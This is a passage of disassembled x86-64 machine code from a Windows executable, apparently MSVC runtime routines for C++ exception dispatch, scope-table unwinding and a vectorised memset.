   140002579:	48 8d 0d 90 ae 00 00 	lea    0xae90(%rip),%rcx        # 0x14000d410
   140002580:	e8 9b a2 00 00       	call   0x14000c820
   140002585:	85 c0                	test   %eax,%eax
   140002587:	74 0e                	je     0x140002597
   140002589:	ba 01 00 00 00       	mov    $0x1,%edx
   14000258e:	48 8b cd             	mov    %rbp,%rcx
   140002591:	ff 15 79 ae 00 00    	call   *0xae79(%rip)        # 0x14000d410
   140002597:	8b 4c f3 10          	mov    0x10(%rbx,%rsi,8),%ecx
   14000259b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400025a1:	49 03 cc             	add    %r12,%rcx
   1400025a4:	49 8b d5             	mov    %r13,%rdx
   1400025a7:	e8 14 07 00 00       	call   0x140002cc0
   1400025ac:	49 8b 47 40          	mov    0x40(%r15),%rax
   1400025b0:	4c 8b c5             	mov    %rbp,%r8
   1400025b3:	8b 54 f3 10          	mov    0x10(%rbx,%rsi,8),%edx
   1400025b7:	49 8b cd             	mov    %r13,%rcx
   1400025ba:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   1400025be:	49 03 d4             	add    %r12,%rdx
   1400025c1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400025c6:	49 8b 47 28          	mov    0x28(%r15),%rax
   1400025ca:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400025cf:	ff 15 5b ab 00 00    	call   *0xab5b(%rip)        # 0x14000d130
   1400025d5:	e8 16 07 00 00       	call   0x140002cf0
   1400025da:	ff c7                	inc    %edi
   1400025dc:	e9 35 ff ff ff       	jmp    0x140002516
   1400025e1:	33 c0                	xor    %eax,%eax
   1400025e3:	e9 b1 00 00 00       	jmp    0x140002699
   1400025e8:	49 8b 77 20          	mov    0x20(%r15),%rsi
   1400025ec:	49 2b f4             	sub    %r12,%rsi
   1400025ef:	e9 96 00 00 00       	jmp    0x14000268a
   1400025f4:	8b cf                	mov    %edi,%ecx
   1400025f6:	48 03 c9             	add    %rcx,%rcx
   1400025f9:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   1400025fd:	4c 3b f0             	cmp    %rax,%r14
   140002600:	0f 82 82 00 00 00    	jb     0x140002688
   140002606:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   14000260a:	4c 3b f0             	cmp    %rax,%r14
   14000260d:	73 79                	jae    0x140002688
   14000260f:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   140002613:	41 83 e2 20          	and    $0x20,%r10d
   140002617:	74 44                	je     0x14000265d
   140002619:	45 33 c9             	xor    %r9d,%r9d
   14000261c:	85 d2                	test   %edx,%edx
   14000261e:	74 38                	je     0x140002658
   140002620:	45 8b c1             	mov    %r9d,%r8d
   140002623:	4d 03 c0             	add    %r8,%r8
   140002626:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   14000262b:	48 3b f0             	cmp    %rax,%rsi
   14000262e:	72 20                	jb     0x140002650
   140002630:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   140002635:	48 3b f0             	cmp    %rax,%rsi
   140002638:	73 16                	jae    0x140002650
   14000263a:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   14000263e:	42 39 44 c3 10       	cmp    %eax,0x10(%rbx,%r8,8)
   140002643:	75 0b                	jne    0x140002650
   140002645:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   140002649:	42 39 44 c3 0c       	cmp    %eax,0xc(%rbx,%r8,8)
   14000264e:	74 08                	je     0x140002658
   140002650:	41 ff c1             	inc    %r9d
   140002653:	44 3b ca             	cmp    %edx,%r9d
   140002656:	72 c8                	jb     0x140002620
   140002658:	44 3b ca             	cmp    %edx,%r9d
   14000265b:	75 37                	jne    0x140002694
   14000265d:	8b 44 cb 10          	mov    0x10(%rbx,%rcx,8),%eax
   140002661:	85 c0                	test   %eax,%eax
   140002663:	74 0c                	je     0x140002671
   140002665:	48 3b f0             	cmp    %rax,%rsi
   140002668:	75 1e                	jne    0x140002688
   14000266a:	45 85 d2             	test   %r10d,%r10d
   14000266d:	75 25                	jne    0x140002694
   14000266f:	eb 17                	jmp    0x140002688
   140002671:	8d 47 01             	lea    0x1(%rdi),%eax
   140002674:	49 8b d5             	mov    %r13,%rdx
   140002677:	41 89 47 48          	mov    %eax,0x48(%r15)
   14000267b:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   140002680:	b1 01                	mov    $0x1,%cl
   140002682:	4d 03 c4             	add    %r12,%r8
   140002685:	41 ff d0             	call   *%r8
   140002688:	ff c7                	inc    %edi
   14000268a:	8b 13                	mov    (%rbx),%edx
   14000268c:	3b fa                	cmp    %edx,%edi
   14000268e:	0f 82 60 ff ff ff    	jb     0x1400025f4
   140002694:	b8 01 00 00 00       	mov    $0x1,%eax
   140002699:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   14000269e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400026a2:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400026a6:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400026aa:	49 8b e3             	mov    %r11,%rsp
   1400026ad:	41 5f                	pop    %r15
   1400026af:	41 5e                	pop    %r14
   1400026b1:	41 5d                	pop    %r13
   1400026b3:	41 5c                	pop    %r12
   1400026b5:	5f                   	pop    %rdi
   1400026b6:	c3                   	ret
   1400026b7:	cc                   	int3
   1400026b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400026bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400026c2:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400026c7:	41 56                	push   %r14
   1400026c9:	48 83 ec 20          	sub    $0x20,%rsp
   1400026cd:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400026d1:	4c 8b f2             	mov    %rdx,%r14
   1400026d4:	48 8b f1             	mov    %rcx,%rsi
   1400026d7:	74 4c                	je     0x140002725
   1400026d9:	48 8b 01             	mov    (%rcx),%rax
   1400026dc:	48 85 c0             	test   %rax,%rax
   1400026df:	74 44                	je     0x140002725
   1400026e1:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400026e5:	48 ff c7             	inc    %rdi
   1400026e8:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1400026ec:	75 f7                	jne    0x1400026e5
   1400026ee:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1400026f2:	e8 9d 14 00 00       	call   0x140003b94
   1400026f7:	48 8b d8             	mov    %rax,%rbx
   1400026fa:	48 85 c0             	test   %rax,%rax
   1400026fd:	74 1c                	je     0x14000271b
   1400026ff:	4c 8b 06             	mov    (%rsi),%r8
   140002702:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   140002706:	48 8b c8             	mov    %rax,%rcx
   140002709:	e8 b2 27 00 00       	call   0x140004ec0
   14000270e:	48 8b c3             	mov    %rbx,%rax
   140002711:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   140002716:	49 89 06             	mov    %rax,(%r14)
   140002719:	33 db                	xor    %ebx,%ebx
   14000271b:	48 8b cb             	mov    %rbx,%rcx
   14000271e:	e8 f5 21 00 00       	call   0x140004918
   140002723:	eb 0a                	jmp    0x14000272f
   140002725:	48 8b 01             	mov    (%rcx),%rax
   140002728:	48 89 02             	mov    %rax,(%rdx)
   14000272b:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   14000272f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002734:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002739:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000273e:	48 83 c4 20          	add    $0x20,%rsp
   140002742:	41 5e                	pop    %r14
   140002744:	c3                   	ret
   140002745:	cc                   	int3
   140002746:	cc                   	int3
   140002747:	cc                   	int3
   140002748:	40 53                	rex push %rbx
   14000274a:	48 83 ec 20          	sub    $0x20,%rsp
   14000274e:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   140002752:	48 8b d9             	mov    %rcx,%rbx
   140002755:	74 08                	je     0x14000275f
   140002757:	48 8b 09             	mov    (%rcx),%rcx
   14000275a:	e8 b9 21 00 00       	call   0x140004918
   14000275f:	48 83 23 00          	andq   $0x0,(%rbx)
   140002763:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   140002767:	48 83 c4 20          	add    $0x20,%rsp
   14000276b:	5b                   	pop    %rbx
   14000276c:	c3                   	ret
   14000276d:	cc                   	int3
   14000276e:	cc                   	int3
   14000276f:	cc                   	int3
   140002770:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002775:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000277a:	57                   	push   %rdi
   14000277b:	48 83 ec 50          	sub    $0x50,%rsp
   14000277f:	48 8b da             	mov    %rdx,%rbx
   140002782:	48 8b f1             	mov    %rcx,%rsi
   140002785:	bf 20 05 93 19       	mov    $0x19930520,%edi
   14000278a:	48 85 d2             	test   %rdx,%rdx
   14000278d:	74 1d                	je     0x1400027ac
   14000278f:	f6 02 10             	testb  $0x10,(%rdx)
   140002792:	74 18                	je     0x1400027ac
   140002794:	48 8b 09             	mov    (%rcx),%rcx
   140002797:	48 83 e9 08          	sub    $0x8,%rcx
   14000279b:	48 8b 01             	mov    (%rcx),%rax
   14000279e:	48 8b 58 30          	mov    0x30(%rax),%rbx
   1400027a2:	48 8b 40 40          	mov    0x40(%rax),%rax
   1400027a6:	ff 15 dc aa 00 00    	call   *0xaadc(%rip)        # 0x14000d288
   1400027ac:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400027b1:	48 8b cb             	mov    %rbx,%rcx
   1400027b4:	ff 15 7e a9 00 00    	call   *0xa97e(%rip)        # 0x14000d138
   1400027ba:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400027bf:	48 85 db             	test   %rbx,%rbx
   1400027c2:	74 0f                	je     0x1400027d3
   1400027c4:	f6 03 08             	testb  $0x8,(%rbx)
   1400027c7:	75 05                	jne    0x1400027ce
   1400027c9:	48 85 c0             	test   %rax,%rax
   1400027cc:	75 05                	jne    0x1400027d3
   1400027ce:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1400027d3:	ba 01 00 00 00       	mov    $0x1,%edx
   1400027d8:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400027dd:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400027e2:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400027e7:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400027ec:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400027f1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400027f6:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400027fa:	ff 15 40 a9 00 00    	call   *0xa940(%rip)        # 0x14000d140
   140002800:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002805:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000280a:	48 83 c4 50          	add    $0x50,%rsp
   14000280e:	5f                   	pop    %rdi
   14000280f:	c3                   	ret
   140002810:	48 83 ec 28          	sub    $0x28,%rsp
   140002814:	e8 7b 06 00 00       	call   0x140002e94
   140002819:	84 c0                	test   %al,%al
   14000281b:	75 04                	jne    0x140002821
   14000281d:	32 c0                	xor    %al,%al
   14000281f:	eb 12                	jmp    0x140002833
   140002821:	e8 02 06 00 00       	call   0x140002e28
   140002826:	84 c0                	test   %al,%al
   140002828:	75 07                	jne    0x140002831
   14000282a:	e8 ad 06 00 00       	call   0x140002edc
   14000282f:	eb ec                	jmp    0x14000281d
   140002831:	b0 01                	mov    $0x1,%al
   140002833:	48 83 c4 28          	add    $0x28,%rsp
   140002837:	c3                   	ret
   140002838:	48 83 ec 28          	sub    $0x28,%rsp
   14000283c:	84 c9                	test   %cl,%cl
   14000283e:	75 0a                	jne    0x14000284a
   140002840:	e8 2b 06 00 00       	call   0x140002e70
   140002845:	e8 92 06 00 00       	call   0x140002edc
   14000284a:	b0 01                	mov    $0x1,%al
   14000284c:	48 83 c4 28          	add    $0x28,%rsp
   140002850:	c3                   	ret
   140002851:	cc                   	int3
   140002852:	cc                   	int3
   140002853:	cc                   	int3
   140002854:	48 85 c9             	test   %rcx,%rcx
   140002857:	74 67                	je     0x1400028c0
   140002859:	88 54 24 10          	mov    %dl,0x10(%rsp)
   14000285d:	48 83 ec 48          	sub    $0x48,%rsp
   140002861:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140002867:	75 53                	jne    0x1400028bc
   140002869:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   14000286d:	75 4d                	jne    0x1400028bc
   14000286f:	8b 41 20             	mov    0x20(%rcx),%eax
   140002872:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002877:	83 f8 02             	cmp    $0x2,%eax
   14000287a:	77 40                	ja     0x1400028bc
   14000287c:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140002880:	48 85 c0             	test   %rax,%rax
   140002883:	74 37                	je     0x1400028bc
   140002885:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002889:	85 d2                	test   %edx,%edx
   14000288b:	74 11                	je     0x14000289e
   14000288d:	48 03 51 38          	add    0x38(%rcx),%rdx
   140002891:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140002895:	e8 2a 00 00 00       	call   0x1400028c4
   14000289a:	eb 20                	jmp    0x1400028bc
   14000289c:	eb 1e                	jmp    0x1400028bc
   14000289e:	f6 00 10             	testb  $0x10,(%rax)
   1400028a1:	74 19                	je     0x1400028bc
   1400028a3:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400028a7:	48 8b 08             	mov    (%rax),%rcx
   1400028aa:	48 85 c9             	test   %rcx,%rcx
   1400028ad:	74 0d                	je     0x1400028bc
   1400028af:	48 8b 01             	mov    (%rcx),%rax
   1400028b2:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400028b6:	ff 15 cc a9 00 00    	call   *0xa9cc(%rip)        # 0x14000d288
   1400028bc:	48 83 c4 48          	add    $0x48,%rsp
   1400028c0:	c3                   	ret
   1400028c1:	cc                   	int3
   1400028c2:	cc                   	int3
   1400028c3:	cc                   	int3
   1400028c4:	48 ff e2             	rex.W jmp *%rdx
   1400028c7:	cc                   	int3
   1400028c8:	48 83 ec 28          	sub    $0x28,%rsp
   1400028cc:	e8 7b 04 00 00       	call   0x140002d4c
   1400028d1:	48 83 c0 20          	add    $0x20,%rax
   1400028d5:	48 83 c4 28          	add    $0x28,%rsp
   1400028d9:	c3                   	ret
   1400028da:	cc                   	int3
   1400028db:	cc                   	int3
   1400028dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400028e0:	e8 67 04 00 00       	call   0x140002d4c
   1400028e5:	48 83 c0 28          	add    $0x28,%rax
   1400028e9:	48 83 c4 28          	add    $0x28,%rsp
   1400028ed:	c3                   	ret
   1400028ee:	cc                   	int3
   1400028ef:	cc                   	int3
   1400028f0:	cc                   	int3
   1400028f1:	cc                   	int3
   1400028f2:	cc                   	int3
   1400028f3:	cc                   	int3
   1400028f4:	cc                   	int3
   1400028f5:	cc                   	int3
   1400028f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400028fd:	00 00 00 
   140002900:	57                   	push   %rdi
   140002901:	8b c2                	mov    %edx,%eax
   140002903:	48 8b f9             	mov    %rcx,%rdi
   140002906:	49 8b c8             	mov    %r8,%rcx
   140002909:	f3 aa                	rep stos %al,(%rdi)
   14000290b:	49 8b c1             	mov    %r9,%rax
   14000290e:	5f                   	pop    %rdi
   14000290f:	c3                   	ret
   140002910:	cc                   	int3
   140002911:	cc                   	int3
   140002912:	cc                   	int3
   140002913:	cc                   	int3
   140002914:	cc                   	int3
   140002915:	cc                   	int3
   140002916:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000291d:	00 00 00 
   140002920:	48 8b c1             	mov    %rcx,%rax
   140002923:	4c 8b c9             	mov    %rcx,%r9
   140002926:	4c 8d 15 d3 d6 ff ff 	lea    -0x292d(%rip),%r10        # 0x140000000
   14000292d:	0f b6 d2             	movzbl %dl,%edx
   140002930:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   140002937:	01 01 01 
   14000293a:	4c 0f af da          	imul   %rdx,%r11
   14000293e:	66 49 0f 6e c3       	movq   %r11,%xmm0
   140002943:	49 83 f8 0f          	cmp    $0xf,%r8
   140002947:	0f 87 83 00 00 00    	ja     0x1400029d0
   14000294d:	0f 1f 00             	nopl   (%rax)
   140002950:	49 03 c8             	add    %r8,%rcx
   140002953:	47 8b 8c 82 00 a0 01 	mov    0x1a000(%r10,%r8,4),%r9d
   14000295a:	00 
   14000295b:	4d 03 ca             	add    %r10,%r9
   14000295e:	41 ff e1             	jmp    *%r9
   140002961:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   140002965:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   140002969:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000296e:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140002972:	c3                   	ret
   140002973:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   140002977:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000297b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   140002980:	c3                   	ret
   140002981:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002988:	0f 1f 84 00 00 00 00 
   14000298f:	00 
   140002990:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   140002994:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   140002998:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000299c:	c3                   	ret
   14000299d:	0f 1f 00             	nopl   (%rax)
   1400029a0:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   1400029a4:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   1400029a8:	c3                   	ret
   1400029a9:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   1400029ad:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   1400029b2:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   1400029b6:	c3                   	ret
   1400029b7:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   1400029bb:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   1400029bf:	c3                   	ret
   1400029c0:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   1400029c4:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   1400029c9:	c3                   	ret
   1400029ca:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   1400029ce:	c3                   	ret
   1400029cf:	90                   	nop
   1400029d0:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   1400029d4:	49 83 f8 20          	cmp    $0x20,%r8
   1400029d8:	77 0c                	ja     0x1400029e6
   1400029da:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   1400029de:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   1400029e5:	c3                   	ret
   1400029e6:	83 3d 2b 46 01 00 03 	cmpl   $0x3,0x1462b(%rip)        # 0x140017018
   1400029ed:	0f 82 dd 01 00 00    	jb     0x140002bd0
   1400029f3:	4c 3b 05 26 46 01 00 	cmp    0x14626(%rip),%r8        # 0x140017020
   1400029fa:	76 16                	jbe    0x140002a12
   1400029fc:	4c 3b 05 25 46 01 00 	cmp    0x14625(%rip),%r8        # 0x140017028
   140002a03:	77 0d                	ja     0x140002a12
   140002a05:	f6 05 68 56 01 00 02 	testb  $0x2,0x15668(%rip)        # 0x140018074
   140002a0c:	0f 85 ee fe ff ff    	jne    0x140002900
   140002a12:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   140002a18:	4c 8b c9             	mov    %rcx,%r9
   140002a1b:	49 83 e1 1f          	and    $0x1f,%r9
   140002a1f:	49 83 e9 20          	sub    $0x20,%r9
   140002a23:	49 2b c9             	sub    %r9,%rcx
   140002a26:	49 2b d1             	sub    %r9,%rdx
   140002a29:	4d 03 c1             	add    %r9,%r8
   140002a2c:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140002a33:	76 65                	jbe    0x140002a9a
   140002a35:	4c 3b 05 ec 45 01 00 	cmp    0x145ec(%rip),%r8        # 0x140017028
   140002a3c:	0f 87 ce 00 00 00    	ja     0x140002b10
   140002a42:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002a49:	1f 84 00 00 00 00 00 
   140002a50:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   140002a54:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   140002a59:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   140002a5e:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   140002a63:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   140002a6a:	00 
   140002a6b:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   140002a72:	00 
   140002a73:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   140002a7a:	00 
   140002a7b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   140002a82:	00 
   140002a83:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   140002a8a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140002a91:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140002a98:	73 b6                	jae    0x140002a50
   140002a9a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   140002a9e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140002aa2:	4d 8b d9             	mov    %r9,%r11
   140002aa5:	49 c1 eb 05          	shr    $0x5,%r11
   140002aa9:	47 8b 9c 9a 40 a0 01 	mov    0x1a040(%r10,%r11,4),%r11d
   140002ab0:	00 
   140002ab1:	4d 03 da             	add    %r10,%r11
   140002ab4:	41 ff e3             	jmp    *%r11
   140002ab7:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   140002abe:	ff ff ff 
   140002ac1:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   140002ac8:	ff ff ff 
   140002acb:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   140002ad2:	ff ff ff 
   140002ad5:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   140002adc:	ff ff ff 
   140002adf:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   140002ae6:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   140002aed:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   140002af4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   140002afb:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   140002aff:	c5 f8 77             	vzeroupper
   140002b02:	c3                   	ret
   140002b03:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002b0a:	84 00 00 00 00 00 
   140002b10:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   140002b14:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   140002b19:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   140002b1e:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   140002b23:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   140002b2a:	00 
   140002b2b:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   140002b32:	00 
   140002b33:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   140002b3a:	00 
   140002b3b:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   140002b42:	00 
   140002b43:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   140002b4a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140002b51:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140002b58:	73 b6                	jae    0x140002b10
   140002b5a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   140002b5e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140002b62:	4d 8b d9             	mov    %r9,%r11
   140002b65:	49 c1 eb 05          	shr    $0x5,%r11
   140002b69:	47 8b 9c 9a 64 a0 01 	mov    0x1a064(%r10,%r11,4),%r11d
   140002b70:	00 
   140002b71:	4d 03 da             	add    %r10,%r11
   140002b74:	41 ff e3             	jmp    *%r11
   140002b77:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   140002b7e:	ff ff ff 
   140002b81:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   140002b88:	ff ff ff 
   140002b8b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   140002b92:	ff ff ff 
   140002b95:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   140002b9c:	ff ff ff 
   140002b9f:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   140002ba6:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   140002bad:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   140002bb4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   140002bbb:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   140002bbf:	0f ae f8             	sfence
   140002bc2:	c5 f8 77             	vzeroupper
   140002bc5:	c3                   	ret
   140002bc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002bcd:	00 00 00 
   140002bd0:	4c 3b 05 49 44 01 00 	cmp    0x14449(%rip),%r8        # 0x140017020
   140002bd7:	76 0d                	jbe    0x140002be6
   140002bd9:	f6 05 94 54 01 00 02 	testb  $0x2,0x15494(%rip)        # 0x140018074
   140002be0:	0f 85 1a fd ff ff    	jne    0x140002900
   140002be6:	4c 8b c9             	mov    %rcx,%r9
   140002be9:	49 83 e1 0f          	and    $0xf,%r9
   140002bed:	49 83 e9 10          	sub    $0x10,%r9
   140002bf1:	49 2b c9             	sub    %r9,%rcx
   140002bf4:	49 2b d1             	sub    %r9,%rdx
   140002bf7:	4d 03 c1             	add    %r9,%r8
   140002bfa:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140002c01:	76 4b                	jbe    0x140002c4e
   140002c03:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002c0a:	84 00 00 00 00 00 
   140002c10:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   140002c14:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   140002c19:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   140002c1e:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   140002c23:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   140002c28:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   140002c2d:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   140002c32:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   140002c37:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140002c3e:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140002c45:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140002c4c:	73 c2                	jae    0x140002c10
   140002c4e:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140002c52:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140002c56:	4d 8b d9             	mov    %r9,%r11
   140002c59:	49 c1 eb 04          	shr    $0x4,%r11
   140002c5d:	47 8b 9c 9a 88 a0 01 	mov    0x1a088(%r10,%r11,4),%r11d
   140002c64:	00 
   140002c65:	4d 03 da             	add    %r10,%r11
   140002c68:	41 ff e3             	jmp    *%r11
   140002c6b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   140002c72:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   140002c79:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   140002c80:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   140002c87:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   140002c8e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   140002c95:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   140002c9c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   140002ca3:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
